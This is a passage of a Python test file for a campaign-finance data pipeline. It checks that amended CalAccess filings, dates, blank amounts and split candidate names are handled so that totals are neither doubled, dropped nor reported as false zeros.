    covers = [('0', 'Dana Ko', 'S'), ('1', 'Dana Ko', 'S'), ('2', 'Robin Delacroix', 'O')]
    head = ('FILING_ID\tAMEND_ID\tFILER_ID\tFILER_NAML\tCAND_NAML\tCAND_NAMF\tSUP_OPP_CD'
            '\tFORM_TYPE\n')
    rows = "".join(f'9990002\t{a}\t8\tCmte\t{name}\t\t{so}\tF496\n' for a, name, so in covers)
    if not cover_amend_ids:     # a database built before AMEND_ID was loaded for covers
        head = head.replace('\tAMEND_ID', '')
        rows = "".join(f'9990002\t8\tCmte\t{name}\t\t{so}\tF496\n' for _, name, so in covers)
    with zipfile.ZipFile(tmp_path / "cache" / "calaccess" / "dbwebexport.zip", "w") as zf:
        zf.writestr("CalAccess/DATA/S496_CD.TSV", ies)
        zf.writestr("CalAccess/DATA/CVR_CAMPAIGN_DISCLOSURE_CD.TSV", head + rows)
    return tmp_path


def test_a_rekeyed_expenditure_counts_once_for_whom_the_latest_amendment_says(tmp_path):
    """Per-transaction dedup kept one row from each amendment and doubled the expenditure.
    The latest amendment alone is right, and that goes for the cover too: amendment 2 is
    against Robin Delacroix, so none of it is Dana Ko support. In the real export, a
    candidate's all-years support total carried other candidates' money this way."""
    from vgpipe import calaccess, queries

    root = _filing_9990002(tmp_path)
    calaccess.build(root)

    delacroix = queries.run("calaccess.ie_total",
                            {"candidate_last": "Delacroix", "first": "Robin", "stance": "oppose"},
                            root)
    assert delacroix.value == 2750.0, f"a re-keyed expenditure was counted twice: {delacroix.value}"
    ko = queries.run("calaccess.ie_total",
                     {"candidate_last": "Ko", "first": "Dana", "stance": "support"}, root)
    assert ko.value is None and not ko.found, (
        f"a superseded cover attributed the expenditure to Ko: {ko.value}")


def test_a_database_without_cover_amend_ids_says_it_needs_a_rebuild(tmp_path):
    """Without CVR AMEND_ID the covers cannot be narrowed to the latest amendment, and no view
    definition can make up a missing column: the live export database was built that way.
    Degrading silently is how a candidate's support total carried other candidates' money.
    A warning alone would still let that total re-run and render green, so the citable query
    refuses; the listing, a finding aid, keeps working under the warning."""
    from vgpipe import calaccess, queries
    from vgpipe.models import QueryCitation
    from vgpipe.verify import verify_source

    root = _filing_9990002(tmp_path, cover_amend_ids=False)
    with pytest.warns(calaccess.DegradedDatabaseWarning):
        calaccess.build(root)

    params = {"candidate_last": "Ko", "first": "Dana", "stance": "support"}
    with pytest.warns(calaccess.DegradedDatabaseWarning, match="vg calaccess build"), \
            pytest.raises(calaccess.DegradedDatabase, match="vg calaccess build"):
        queries.run("calaccess.ie_total", params, root)

    cited = src(query=QueryCitation(name="calaccess.ie_total", params=params, expected="2750"))
    with pytest.warns(calaccess.DegradedDatabaseWarning):
        out = verify_source(cited, root)
    assert out.verification.status != "verified", "a degraded database must not verify a total"
    assert "vg calaccess build" in out.verification.reason

    with pytest.warns(calaccess.DegradedDatabaseWarning):
        assert calaccess.independent_expenditures(root, "Delacroix", first="Robin")


def test_a_database_built_before_a_view_fix_still_gets_the_fix(tmp_path):
    """Views are created at build time, so a corrected definition never reached a database
    built before it — the same trap EXTRACTOR_VERSION closes for cached pages. The real export
    database was built with the per-transaction view; connect() must shadow it."""
    import sqlite3

    from vgpipe import calaccess

    root = _fake_export(tmp_path)
    calaccess.build(root)
    con = sqlite3.connect(calaccess.db_path(root))
    con.execute("DROP VIEW RCPT_LATEST")
    con.execute("""CREATE VIEW RCPT_LATEST AS
        SELECT t.* FROM RCPT_CD t
        JOIN (SELECT FILING_ID, TRAN_ID, MAX(CAST(AMEND_ID AS INTEGER)) AS a
              FROM RCPT_CD GROUP BY FILING_ID, TRAN_ID) m
          ON m.FILING_ID = t.FILING_ID AND m.TRAN_ID = t.TRAN_ID
         AND CAST(t.AMEND_ID AS INTEGER) = m.a""")
    con.commit()
    con.close()

    got = calaccess.contributions_to(root, "1234567", top=20)
    assert not [c for c in got if "Withdrawn" in c.contributor], (
        "the stale view baked into an old database was used")


def test_no_amend_id_means_no_latest_view(tmp_path):
    """Without AMEND_ID nothing can pick the latest amendment. Defining the view anyway would
    fail later on the column; leaving it undefined fails on the view, and never sums every
    amendment as if it were one."""
    import sqlite3
    import zipfile

    from vgpipe import calaccess

    (tmp_path / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    receipts = ('FILING_ID\tTRAN_ID\tCTRIB_NAML\tRCPT_DATE\tAMOUNT\n'
                '1\tT1\tBig PAC\t1/2/2026 12:00:00 AM\t9000\n')
    filings = 'FILER_ID\tFILING_ID\tFORM_ID\tFILING_DATE\n7\t1\tF460\t2/1/2026 12:00:00 AM\n'
    with zipfile.ZipFile(tmp_path / "cache" / "calaccess" / "dbwebexport.zip", "w") as zf:
        zf.writestr("CalAccess/DATA/RCPT_CD.TSV", receipts)
        zf.writestr("CalAccess/DATA/FILER_FILINGS_CD.TSV", filings)
    calaccess.build(tmp_path)

    with pytest.raises(sqlite3.OperationalError, match="no such table: RCPT_LATEST"):
        calaccess.contributions_to(tmp_path, "7")


def _cover_only_amendment(tmp_path, *, receipts="", ies="", filings="", covers):
    """A filing whose latest amendment has a cover record and no rows in the fact tables:
    the export's own shape for an amendment that did not restate a schedule. Each cover is
    (FILING_ID, AMEND_ID, FILER_ID, FILER_NAML, CAND_NAML, CAND_NAMF, SUP_OPP_CD, FORM_TYPE)."""
    import zipfile

    (tmp_path / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    head = ('FILING_ID\tAMEND_ID\tFILER_ID\tFILER_NAML\tCAND_NAML\tCAND_NAMF\tSUP_OPP_CD'
            '\tFORM_TYPE\n')
    with zipfile.ZipFile(tmp_path / "cache" / "calaccess" / "dbwebexport.zip", "w") as zf:
        zf.writestr("CalAccess/DATA/CVR_CAMPAIGN_DISCLOSURE_CD.TSV",
                    head + "".join("\t".join(c) + "\n" for c in covers))
        for member, body in (("RCPT_CD", receipts), ("S496_CD", ies),
                             ("FILER_FILINGS_CD", filings)):
            if body:
                zf.writestr(f"CalAccess/DATA/{member}.TSV", body)
    return tmp_path


def test_an_amendment_that_restates_no_receipts_does_not_erase_them(tmp_path):
    """A filing as the export carries it: amendment 1 is a cover whose explanation is
    "A missing address was added", and it has no receipt rows. Taking "latest" from the cover
    would make that address fix erase $38,325 of receipts, a silent undercount. On the full
    export, 123 filings whose latest amendment's explanation names some other change (a
    signature, a date, other schedules) would lose $36.0M that way. So "latest" is per
    fact table."""
    from vgpipe import calaccess, queries

    receipts = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tCTRIB_NAML\tCTRIB_NAMF\tCTRIB_EMP'
                '\tCTRIB_OCC\tRCPT_DATE\tAMOUNT\tFORM_TYPE\n'
                '9990005\t0\tINC1207\t12\tNeighbors for Clean Water, Yes on Measure A'
                '\t\t\t\t3/16/2009 12:00:00 AM\t26450\tF401A\n'
                '9990005\t0\tIDT318\t4\tCoalition to Protect Local Parks'
                '\t\t\t\t2/11/2009 12:00:00 AM\t11875\tF401A\n')
    filings = ('FILER_ID\tFILING_ID\tFORM_ID\tFILING_DATE\n'
               '9990015\t9990005\tF401\t7/22/2009 4:17:22 PM\n'
               '9990015\t9990005\tF401\t9/17/2009 11:08:46 AM\n')
    covers = [("9990005", a, "9990016", "Example County Voter Guide", "", "", "", "F401")
              for a in ("0", "1")]
    root = _cover_only_amendment(tmp_path, receipts=receipts, filings=filings, covers=covers)
    calaccess.build(root)

    got = calaccess.contributions_to(root, "9990015")
    assert sorted(c.amount for c in got) == [11875.0, 26450.0], (
        "an amendment that only fixed an address erased the filing's receipts")
    total = queries.run("calaccess.contributor_total",
                        {"filer_id": "9990015",
                         "contributor": "Neighbors for Clean Water, Yes on Measure A"}, root)
    assert total.found and total.value == 26450.0


def test_an_amendment_that_restates_no_expenditures_does_not_zero_them(tmp_path):
    """A filing as the export carries it: amendment 1 says it updates the expenditure
    and has no Form 496 rows, and both amendments' covers support Emerson Vance. Taking
    "latest" from the cover would report no expenditure for a $1,086,420 buy the filer says it
    updated, not withdrew. The per-table rule keeps amendment 0's row. Whether that is the
    updated amount is #31's to flag; the export cannot say."""
    from vgpipe import calaccess, queries

    ies = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tAMOUNT\tEXP_DATE\tEXPN_DSCR\n'
           '9990003\t0\tEDT2\t1\t1086420\t4/16/2026 12:00:00 AM\tdigital ads\n')
    committee = ("9990004", "Educators Forward")
    covers = [("9990003", a, *committee, "Emerson Vance", "", "S", "F496") for a in ("0", "1")]
    root = _cover_only_amendment(tmp_path, ies=ies, covers=covers)
    calaccess.build(root)

    got = queries.run("calaccess.ie_total", {"candidate_last": "Vance", "first": "Emerson",
                                             "stance": "support"}, root)
    assert got.found and got.value == 1086420.0, (
        f"an amendment that updated an expenditure zeroed it: {got}")


def _dated_receipts(tmp_path):
    """A large old gift, a small recent one and a smaller undated one, dated as the export
    dates them (the dirty export does carry blank RCPT_DATEs)."""
    import zipfile

    (tmp_path / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    receipts = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tCTRIB_NAML\tCTRIB_NAMF\tCTRIB_EMP'
                '\tCTRIB_OCC\tRCPT_DATE\tAMOUNT\tFORM_TYPE\n'
                '1\t0\tT1\t1\tOld PAC\t\t\t\t3/1/2010 12:00:00 AM\t50000\tA\n'
                '2\t0\tT2\t1\tNew PAC\t\t\t\t10/14/2025 12:00:00 AM\t1000\tA\n'
                '3\t0\tT3\t1\tUndated PAC\t\t\t\t\t500\tA\n')
    filings = ('FILER_ID\tFILING_ID\tFORM_ID\tFILING_DATE\n'
               '7\t1\tF460\t3/31/2010 12:00:00 AM\n'
               '7\t2\tF460\t10/31/2025 12:00:00 AM\n'
               '7\t3\tF460\t10/31/2025 12:00:00 AM\n')
    with zipfile.ZipFile(tmp_path / "cache" / "calaccess" / "dbwebexport.zip", "w") as zf:
        zf.writestr("CalAccess/DATA/RCPT_CD.TSV", receipts)
        zf.writestr("CalAccess/DATA/FILER_FILINGS_CD.TSV", filings)
    return tmp_path


def test_contributions_since_compares_dates_not_strings(tmp_path):
    """RCPT_DATE is "M/D/YYYY 12:00:00 AM" text. Compared as a string against 2025-01-01,
    10/14/2025 sorted before it and was dropped, while 3/1/2010 sorted after it and was kept."""
    from vgpipe import calaccess

    root = _dated_receipts(tmp_path)
    calaccess.build(root)

    got = calaccess.contributions_to(root, "7", since="2025-01-01")
    assert [(c.contributor, c.date) for c in got if c.date] == [("New PAC", "2025-10-14")]
    assert "Old PAC" not in [c.contributor for c in calaccess.contributions_to(
        root, "7", since="2025")]
    assert len(calaccess.contributions_to(root, "7", since="2010-03-01")) == 3


def test_contributions_since_keeps_a_gift_it_cannot_date(tmp_path):
    """A blank RCPT_DATE cannot be placed before or after `since`. Dropping it silently would
    be a missing donation; it stays in the list, with its date showing blank."""
    from vgpipe import calaccess

    root = _dated_receipts(tmp_path)
    calaccess.build(root)

    got = calaccess.contributions_to(root, "7", since="2025-01-01")
    assert [(c.contributor, c.date) for c in got] == [("New PAC", "2025-10-14"),
                                                      ("Undated PAC", "")]
    assert len(calaccess.contributions_to(root, "7", since=None)) == 3, (
        "since=None must mean no filter, not an empty list")

    # build() writes blanks, but a NULL date from anywhere else must not vanish either
    import sqlite3

    con = sqlite3.connect(calaccess.db_path(root))
    con.execute("UPDATE RCPT_CD SET RCPT_DATE = NULL WHERE TRAN_ID = 'T3'")
    con.commit()
    con.close()
    got = calaccess.contributions_to(root, "7", since="2025-01-01")
    assert "Undated PAC" in [c.contributor for c in got], "a NULL date dropped the gift"

    # a date that will not normalize is kept too, and shown as filed rather than as "09-05-24"
    con = sqlite3.connect(calaccess.db_path(root))
    con.execute("UPDATE RCPT_CD SET RCPT_DATE = '5/24/09 12:00:00 AM' WHERE TRAN_ID = 'T3'")
    con.commit()
    con.close()
    got = calaccess.contributions_to(root, "7", since="2025-01-01")
    assert ("Undated PAC", "5/24/09 12:00:00 AM") in [(c.contributor, c.date) for c in got]


def test_contributions_since_filters_before_the_limit(tmp_path):
    """Filtering after LIMIT took the top N of ALL years and then discarded the old ones, so
    the largest recent gifts never made the list — here, an empty list."""
    from vgpipe import calaccess

    root = _dated_receipts(tmp_path)
    calaccess.build(root)

    got = calaccess.contributions_to(root, "7", top=1, since="2025-01-01")
    assert [c.contributor for c in got] == ["New PAC"]


def test_contributions_since_refuses_a_date_it_cannot_compare(tmp_path):
    """A since of "10/14/2025" compares as text against ISO dates and filters nonsense
    silently. Refuse it rather than return a plausible-looking list."""
    import typer

    from vgpipe import calaccess, cli

    root = _dated_receipts(tmp_path)
    calaccess.build(root)

    with pytest.raises(ValueError, match="YYYY-MM-DD"):
        calaccess.contributions_to(root, "7", since="10/14/2025")
    with pytest.raises(typer.Exit):
        cli.calaccess_contributions("7", data=root, since="10/14/2025")


def test_query_citation_verifies_by_rerunning_not_by_text(tmp_path, monkeypatch):
    """⌘F is the wrong verification for a database: a contribution total is not a string on a
    page, and forcing it to be one is what pushed researchers onto third-party mirrors. A
    query citation is checked by re-running it — reproducible, and no page to go stale."""
    from vgpipe import queries
    from vgpipe.models import QueryCitation
    from vgpipe.verify import verify_source

    monkeypatch.setitem(
        queries.REGISTRY, "test.total",
        queries.Query(lambda root, **kw: queries.QueryResult(value=12345.0, detail="2 gift(s)"),
                      ("filer_id",), "test", 1))

    s = src(query=QueryCitation(name="test.total", params={"filer_id": "1"}, expected="12345"))
    out = verify_source(s, tmp_path)
    assert out.verification.status == "verified"
    assert "re-running the query" in out.verification.reason
    assert "uv run vg query test.total" in out.verification.reason

    wrong = src(query=QueryCitation(name="test.total", params={"filer_id": "1"},
                                    expected="99999"))
    assert verify_source(wrong, tmp_path).verification.status == "snippet_not_found"


def test_a_query_miss_is_not_a_zero(tmp_path, monkeypatch):
    """A slightly-wrong donor name returned 0.0, which reads as 'this donor gave nothing' — a
    false finding dressed as a verified one. A miss must be None, with suggestions."""
    from vgpipe import queries
    from vgpipe.models import QueryCitation
    from vgpipe.verify import verify_source

    monkeypatch.setitem(
        queries.REGISTRY, "test.miss",
        queries.Query(lambda root, **kw: queries.QueryResult(value=None, found=False,
                                                             suggestions=["Real Name PAC SCC"],
                                                             detail="0 gift(s)"),
                      ("filer_id",), "test", 1))

    s = src(query=QueryCitation(name="test.miss", params={"filer_id": "1"}, expected="0"))
    out = verify_source(s, tmp_path)
    assert out.verification.status == "snippet_not_found", "a miss must not verify as zero"
    assert "Real Name PAC SCC" in out.verification.reason


def _ie_export(tmp_path):
    """Two spellings of one candidate's name, as filers actually file them."""
    import zipfile

    (tmp_path / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    ies = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tAMOUNT\tEXP_DATE\tEXPN_DSCR\n'
           '1\t0\tA\t1\t612345.67\t5/24/2026 12:00:00 AM\tmailers\n'
           '2\t0\tB\t1\t234567.89\t5/4/2006 12:00:00 AM\tslate\n')
    covers = ('FILING_ID\tAMEND_ID\tFILER_ID\tFILER_NAML\tCAND_NAML\tCAND_NAMF\tSUP_OPP_CD'
              '\tFORM_TYPE\n'
              # whole name in the LAST field, first blank — how the opposing committee filed
              '1\t0\t9\tOpposing Cmte\tDANA KO\t\tO\tF496\n'
              '2\t0\t8\tSupporting Cmte\tKo\tDana\tS\tF496\n')
    with zipfile.ZipFile(tmp_path / "cache" / "calaccess" / "dbwebexport.zip", "w") as zf:
        zf.writestr("CalAccess/DATA/S496_CD.TSV", ies)
        zf.writestr("CalAccess/DATA/CVR_CAMPAIGN_DISCLOSURE_CD.TSV", covers)
    return tmp_path


def test_ie_total_finds_the_name_however_the_filer_split_it(tmp_path):
    """The committee that spent $612,345.67 against Dana Ko put the whole name in the
    LAST-name field. A (last='Ko', first='Dana') filter therefore returned $0.00 — a
    confident "nobody spent against her", which is the worst error this project can make."""
    from vgpipe import calaccess, queries

    root = _ie_export(tmp_path)
    calaccess.build(root)

    opp = queries.run("calaccess.ie_total",
                      {"candidate_last": "Ko", "first": "Dana", "stance": "oppose"}, root)
    assert opp.found and opp.value == 612345.67

    sup = queries.run("calaccess.ie_total",
                      {"candidate_last": "Ko", "first": "Dana", "stance": "support"}, root)
    assert sup.found and sup.value == 234567.89


def test_ie_total_never_reports_an_absence_as_zero(tmp_path):
    """SUM() over no rows is 0.0, and a zero reads as a finding. It must be None."""
    from vgpipe import calaccess, queries

    root = _ie_export(tmp_path)
    calaccess.build(root)

    got = queries.run("calaccess.ie_total",
                      {"candidate_last": "Ko", "first": "Dana", "stance": "oppose",
                       "since": "2010-01", "until": "2010-12"}, root)
    assert got.value is None and got.found is False
    assert "NO MATCH" in got.note


def test_ie_total_date_window_separates_races(tmp_path):
    """Unfiltered, a candidate's old legislative race and current statewide race sum together
    — a figure that answers neither. EXP_DATE is M/D/YYYY text, so string comparison won't do
    it."""
    from vgpipe import calaccess, queries

    root = _ie_export(tmp_path)
    calaccess.build(root)

    recent = queries.run("calaccess.ie_total",
                         {"candidate_last": "Ko", "first": "Dana",
                          "since": "2025-01", "until": "2026-12"}, root)
    assert recent.value == 612345.67, "10/2006 must not sort inside a 2025-2026 window"

    old = queries.run("calaccess.ie_total",
                      {"candidate_last": "Ko", "first": "Dana",
                       "since": "2006-01", "until": "2006-12"}, root)
    assert old.value == 234567.89

    both = queries.run("calaccess.ie_total", {"candidate_last": "Ko", "first": "Dana"}, root)
    assert both.value == 612345.67 + 234567.89
    assert "NO DATE FILTER" in both.note, "an unbounded total must say so"


def _ie_dated_export(tmp_path):
    """One candidate's expenditures either side of the bounds that went wrong, dated as the
    export dates them, plus one the export left undated (the real S496_CD has 31)."""
    import zipfile

    (tmp_path / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    ies = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tAMOUNT\tEXP_DATE\tEXPN_DSCR\n'
           '1\t0\tA\t1\t1\t6/1/2025 12:00:00 AM\tmailers\n'
           '1\t0\tB\t2\t10\t5/23/2026 12:00:00 AM\tdigital\n'
           '1\t0\tC\t3\t100\t5/24/2026 12:00:00 AM\ttv\n'
           '1\t0\tD\t4\t1000\t\tundated\n')
    covers = ('FILING_ID\tAMEND_ID\tFILER_ID\tFILER_NAML\tCAND_NAML\tCAND_NAMF\tSUP_OPP_CD'
              '\tFORM_TYPE\n'
              '1\t0\t9\tSupporting Cmte\tKo\tDana\tS\tF496\n')
    with zipfile.ZipFile(tmp_path / "cache" / "calaccess" / "dbwebexport.zip", "w") as zf:
        zf.writestr("CalAccess/DATA/S496_CD.TSV", ies)
        zf.writestr("CalAccess/DATA/CVR_CAMPAIGN_DISCLOSURE_CD.TSV", covers)
    return tmp_path


@pytest.mark.parametrize(("since", "until", "want"), [
    # Both bounds were cut to YYYY-MM and compared with BETWEEN: '2025-06' > '2025', so a
    # window ending "2025" held nothing from 2025 at all.
    ("", "2025", 1),
    ("2025", "2025", 1),
    # ...and a day was widened to its whole month, so 5/23 counted from "2026-05-24".
    ("2026-05-24", "", 100),
    ("", "2026-05-23", 11),
    # Month precision, which every recorded citation uses, means what it always did.
    ("2025-06", "2026-05", 111),
    ("2025-07", "2026-04", None),
])
def test_ie_total_compares_each_bound_at_its_own_precision(tmp_path, since, until, want):
    from vgpipe import calaccess, queries

    root = _ie_dated_export(tmp_path)
    calaccess.build(root)

    got = queries.run("calaccess.ie_total", {"candidate_last": "Ko", "first": "Dana",
                                             "since": since, "until": until}, root)
    assert got.value == want


def test_ie_total_window_leaves_out_a_row_it_cannot_date_and_says_so(tmp_path):
    """An undated expenditure cannot be placed inside a window. The old BETWEEN kept it out;
    comparing only `until` would let '' <= '2026-12' count it in a figure about 2026. Leaving
    it out is only honest if the result says so: silently, it is a missing expenditure."""
    from vgpipe import calaccess, queries

    root = _ie_dated_export(tmp_path)
    calaccess.build(root)

    dana = {"candidate_last": "Ko", "first": "Dana"}
    for window in ({"until": "2026-12"}, {"since": "2025"}):
        got = queries.run("calaccess.ie_total", {**dana, **window}, root)
        assert got.value == 111 and got.rows == 3
        assert "1 more with no readable date, not counted ($1,000.00 between them)" in got.note

    # a window holding nothing dated is still a miss, never a zero, and still says so
    got = queries.run("calaccess.ie_total", {**dana, "since": "2030"}, root)
    assert got.value is None and not got.found
    assert "1 more with no readable date" in got.note

    got = queries.run("calaccess.ie_total", dana, root)
    assert got.value == 1111, "with no window the undated row counts"
    assert "NO DATE FILTER" in got.note and "readable date" not in got.note

    # a date of the right shape that is no date -- day-first, "2025-14-10" -- is undated too,
    # not silently placed by string order
    import sqlite3

    con = sqlite3.connect(calaccess.db_path(root))
    con.execute("UPDATE S496_CD SET EXP_DATE = '14/10/2025 12:00:00 AM' WHERE TRAN_ID = 'D'")
    con.commit()
    con.close()
    got = queries.run("calaccess.ie_total", {**dana, "until": "2025-12"}, root)
    assert got.value == 1 and "1 more with no readable date" in got.note
    listed = calaccess.independent_expenditures(root, "Ko", first="Dana")
    assert {r["EXPN_DSCR"].strip(): r["EXP_DATE"] for r in listed}["undated"] == (
        "14/10/2025 12:00:00 AM"), "shown as filed, not as a date it is not"

    # the real export's undated rows have a blank AMOUNT, which is not "$0.00"
    con = sqlite3.connect(calaccess.db_path(root))
    con.execute("UPDATE S496_CD SET AMOUNT = '' WHERE TRAN_ID = 'D'")
    con.commit()
    con.close()
    got = queries.run("calaccess.ie_total", {**dana, "until": "2026-12"}, root)
    assert got.note.endswith("; 1 more with no readable date, not counted")


@pytest.mark.parametrize("unread", ["", "   ", "N/A", "-", "1,000", "$100", "1.2.3", "[/]"])
def test_ie_total_never_reports_an_unreadable_amount_as_zero(tmp_path, capsys, unread):
    """A blank AMOUNT cast to 0.0 and still counted as a row, so a window whose only row had
    one came back found, "$0.00, 1 expenditure(s)" -- and verified against an expected "0".
    The real export has two such dated rows (two filings, both 2018). CAST
    reads any other non-number the same way ("N/A" as 0.0, "1,000" as 1.0). An amount that is
    not a plain decimal is money nobody stated: left out of the sum and the count, and named."""
    import sqlite3

    from vgpipe import calaccess, cli, queries
    from vgpipe.models import QueryCitation
    from vgpipe.verify import verify_source

    root = _ie_dated_export(tmp_path)
    calaccess.build(root)
    con = sqlite3.connect(calaccess.db_path(root))
    con.execute("UPDATE S496_CD SET AMOUNT = ? WHERE TRAN_ID = 'C'", (unread,))   # 5/24/2026
    con.commit()
    con.close()

    dana = {"candidate_last": "Ko", "first": "Dana"}
    only_unread = {**dana, "since": "2026-05-24"}
    got = queries.run("calaccess.ie_total", only_unread, root)
    assert got.value is None and not got.found and got.rows == 0
    # "counted": there was an expenditure, only none with an amount to sum
    assert got.note.startswith("no any-stance expenditures counted in 2026-05-24.....; "
                               "1 more with no readable amount, not counted")
    for expected in ("0", "1", "100"):
        cited = src(query=QueryCitation(name="calaccess.ie_total", params=only_unread,
                                        expected=expected))
        assert verify_source(cited, root).verification.status != "verified"

    # beside a stated amount, the unreadable row is out of the count as well as the sum
    got = queries.run("calaccess.ie_total", {**dana, "since": "2026-05", "until": "2026-05"},
                      root)
    assert got.value == 10 and got.rows == 1
    assert got.note.startswith(
        "1 expenditure(s), 2026-05..2026-05; 1 more with no readable amount, not counted; ")

    # and with no window, where it used to count as a $0 expenditure
    got = queries.run("calaccess.ie_total", dana, root)
    assert got.value == 1011 and got.rows == 3
    assert "; 1 more with no readable amount, not counted — NO DATE FILTER" in got.note

    # the listing a researcher finds filings with must not print it as "$0" either: a blank
    # says so, and filer text is shown as filed (escaped, so "[/]" is not rich markup)
    capsys.readouterr()
    cli.calaccess_ie("Ko", data=root, first="Dana")
    listed = next(line for line in capsys.readouterr().out.splitlines() if "2026-05-24" in line)
    assert listed.split()[0] == (unread.strip() or "blank")


@pytest.mark.parametrize("zero", ["0", "0.00", "-0"])
def test_ie_total_counts_a_stated_zero(tmp_path, zero):
    """Only an amount that is not a number is unknown money. A "0" is the filer's own figure --
    the real export has 155 of them -- and counts as one."""
    import sqlite3

    from vgpipe import calaccess, queries

    root = _ie_dated_export(tmp_path)
    calaccess.build(root)
    con = sqlite3.connect(calaccess.db_path(root))
    con.execute("UPDATE S496_CD SET AMOUNT = ? WHERE TRAN_ID = 'C'", (zero,))
    con.commit()
    con.close()

    got = queries.run("calaccess.ie_total",
                      {"candidate_last": "Ko", "first": "Dana", "since": "2026-05-24"}, root)
    assert got.found and got.value == 0.0 and got.rows == 1
    assert "readable amount" not in got.note


@pytest.mark.parametrize("value", [
    "10/14/2025",   # was cut to "10/14/2" and compared as text
    "２０２５",       # full-width digits pass \d, and sort after every ASCII date
    "2025-13", "2025-00", "2025-02-31",   # the right shape, and no such date
    "2025-1", "25",
])
@pytest.mark.parametrize("bound", ["since", "until"])
def test_ie_total_refuses_a_date_it_cannot_compare(tmp_path, bound, value):
    """A bound that is not a real ISO date bounded a window nobody asked for, silently — and a
    total from that window still matched its own recorded `expected`, so it rendered
    verified. until="2025-00" quietly ended the window at 2024."""
    from vgpipe import calaccess, queries
    from vgpipe.models import QueryCitation
    from vgpipe.verify import verify_source

    root = _ie_dated_export(tmp_path)
    calaccess.build(root)

    params = {"candidate_last": "Ko", "first": "Dana", bound: value}
    with pytest.raises(ValueError, match=f"{bound} must be a date as YYYY-MM-DD, YYYY-MM"):
        queries.run("calaccess.ie_total", params, root)

    # "111" is what since="10/14/2025" returned before, by string order
    cited = src(query=QueryCitation(name="calaccess.ie_total", params=params, expected="111"))
    out = verify_source(cited, root)
    assert out.verification.status != "verified"
    assert f"{bound} must be" in out.verification.reason


@pytest.mark.parametrize(("since", "until"), [
    ("2026-05", "2025-12"), ("2025-06-16", "2025-06-15"), ("2026", "2025-12-31")])
def test_ie_total_refuses_a_window_that_ends_before_it_starts(tmp_path, since, until):
    """No date satisfies it, so it came back as a well-formed "no expenditures in this
    window" — a finding made out of a typo."""
    from vgpipe import calaccess, queries

    root = _ie_dated_export(tmp_path)
    calaccess.build(root)

    dana = {"candidate_last": "Ko", "first": "Dana"}
    with pytest.raises(ValueError, match="is after until"):
        queries.run("calaccess.ie_total", {**dana, "since": since, "until": until}, root)
    # the edges are a window, not an inversion
    for s, u in (("2025-06", "2025-06-15"), ("2025-06-15", "2025-06"), ("2025", "2025")):
        queries.run("calaccess.ie_total", {**dana, "since": s, "until": u}, root)


def test_check_date_accepts_every_real_iso_date():
    from vgpipe import calaccess

    for ok in ("", "2025", "2025-12", "2024-02-29", "2026-05-24"):
        assert calaccess.check_date(ok, "since") == ok
    assert calaccess.check_date(None, "since") == ""


def test_ie_listing_prints_iso_dates(tmp_path, capsys):
    """The listing sliced the raw EXP_DATE to 10 characters, which cuts "9/1/2026 12:00:00 AM"
    partway through its time: "9/1/2026 1". It gives the ISO date, as contributions_to() does,
    and a date it cannot read as it was filed."""
    from vgpipe import calaccess, cli

    root = _ie_dated_export(tmp_path)
    calaccess.build(root)

    rows = calaccess.independent_expenditures(root, "Ko", first="Dana")
    assert {r["EXPN_DSCR"].strip(): r["EXP_DATE"] for r in rows} == {
        "mailers": "2025-06-01", "digital": "2026-05-23", "tv": "2026-05-24", "undated": ""}

    import sqlite3

    con = sqlite3.connect(calaccess.db_path(root))
    con.execute("UPDATE S496_CD SET EXP_DATE = '5/24/09 12:00:00 AM' WHERE TRAN_ID = 'D'")
    con.commit()
    con.close()
    rows = calaccess.independent_expenditures(root, "Ko", first="Dana")
    assert {r["EXPN_DSCR"].strip(): r["EXP_DATE"] for r in rows}["undated"] == "5/24/09 12:00:00 AM"

    capsys.readouterr()
    cli.calaccess_ie("Ko", data=root, first="Dana")
    out = capsys.readouterr().out
    assert "2025-06-01" in out and "6/1/2025" not in out


def test_top_contributor_does_not_merge_donors_by_surname(tmp_path):
    """CTRIB_NAML is the surname for individuals, so grouping on it alone merged unrelated
    donors into one contributor — a contributor that does not exist."""
    import zipfile

    from vgpipe import calaccess, queries

    (tmp_path / "cache" / "calaccess").mkdir(parents=True, exist_ok=True)
    receipts = ('FILING_ID\tAMEND_ID\tTRAN_ID\tLINE_ITEM\tCTRIB_NAML\tCTRIB_NAMF\tCTRIB_EMP'
                '\tCTRIB_OCC\tRCPT_DATE\tAMOUNT\tFORM_TYPE\n'
                '1\t0\tT1\t1\tRivera\tAlex\t\t\t1/1/2026 12:00:00 AM\t9000\tA\n'
                '1\t0\tT2\t2\tRivera\tSam\t\t\t1/2/2026 12:00:00 AM\t9000\tA\n'
                '1\t0\tT3\t3\tBig PAC\t\t\t\t1/3/2026 12:00:00 AM\t12000\tA\n')
    filings = 'FILER_ID\tFILING_ID\tFORM_ID\tFILING_DATE\n7\t1\tF460\t2/1/2026 12:00:00 AM\n'
    with zipfile.ZipFile(tmp_path / "cache" / "calaccess" / "dbwebexport.zip", "w") as zf:
        zf.writestr("CalAccess/DATA/RCPT_CD.TSV", receipts)
        zf.writestr("CalAccess/DATA/FILER_FILINGS_CD.TSV", filings)
    calaccess.build(tmp_path)

    got = queries.run("calaccess.top_contributor", {"filer_id": "7"}, tmp_path)
    assert got.value == "Big PAC", f"two unrelated Riveras were merged: got {got.value!r}"


def test_an_organizations_own_endorsement_is_not_a_mirror():
    """secondary_host asks whether a primary document is cited from somewhere other than the
    issuing authority. For an endorsement the endorsing organization IS the authority, so
    flagging the party's own site told a run to "repair" genuine primary sources."""
    from vgpipe.verify import secondary_host

    own = src(url="https://examplecountyparty.org/endorsements/2030",
              publisher="Example County Party", author="Example County Party",
              source_type="own_statement",
              snippet="endorsed for County Assessor")
    assert not secondary_host(own)

    # a filing hosted somewhere other than the filer is still flagged
    copy = src(url="https://transparencyusa.org/ca/committee/x", publisher="Transparency USA",
               author="Transparency USA", source_type="primary_document")
    assert secondary_host(copy)


def test_query_citations_survive_revalidation(tmp_path, monkeypatch):
    """A query citation has no cached page by design — that is the point of it, since
